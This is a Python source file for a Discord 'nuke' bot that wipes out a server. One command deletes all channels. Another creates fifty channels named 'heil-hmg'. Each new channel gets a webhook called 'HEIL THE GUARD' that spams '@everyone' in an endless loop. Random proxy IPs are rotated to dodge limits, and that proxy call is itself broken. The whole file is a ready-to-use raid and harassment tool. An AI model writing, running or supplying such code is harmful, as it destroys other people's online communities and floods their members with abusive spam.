import asyncio 
import discord 
import requests 
import random 
from discord.ext import commands 
  
token = input("token:") 
proxies = ["213.241.205.1", "184.191.162.4", "80.15.19.7", "103.210.57.243", "50.228.226.58", "103.149.130.38", "41.65.174.98", "103.242.119.88", "117.54.114.32", "122.9.21.228", "103.127.1.130", "51.159.115.233", "73.185.216.244", "124.13.181.6", "103.156.56.2", "203.89.126.250", "157.245.27.9", "5.78.46.213", "75.89.101.62", "103.121.149.69", "113.161.131.43", "41.93.71.12", "196.1.95.128", "65.108.230.239", "103.118.78.194"] 
prefix = '>' 
client = commands.Bot( 
  command_prefix=prefix, 
  intents=discord.Intents.all() 
  ) 
  
def change_proxy(): 
  proxy = random.choice(proxies) 
  requests.get("https://discord.com/api/v6/channels/{channel.id}", proxies={"http": proxy, "https": proxy}) 
  
 
@client.command() 
async def cdel(ctx): 
  guild = ctx.guild 
  channel_list = guild.channels 
  while channel_list: 
    for c in channel_list: 
      await c.delete() 
      change_proxy() 
      await ctx.send("All channels have been deleted") 
  
@client.command() 
async def mch(ctx): 
  guild = ctx.guild 
  try: 
    for x in range(50): 
      await guild.create_text_channel("heil-hmg") 
      change_proxy() 
  except Exception as e: 
    print(f"{e}") 
  
@client.command() 
async def nuke(ctx): 
  await ctx.message.delete() 
  tasks = [cdel(ctx), mch(ctx)] 
  await asyncio.gather(*tasks) 
  
@client.event 
async def on_connect(): 
  print('online') 
  
@client.event 
async def on_guild_channel_create(channel): 
  webhook = await channel.create_webhook(name="HEIL THE GUARD") 
  try: 
    while True: 
      change_proxy() 
      await webhook.send("@everyone hi") 
      change_proxy() 
      await channel.send("@everyone hi") 
      change_proxy() 
  except Exception as e: 
    print(f"{e}") 
    
  
client.run(token)
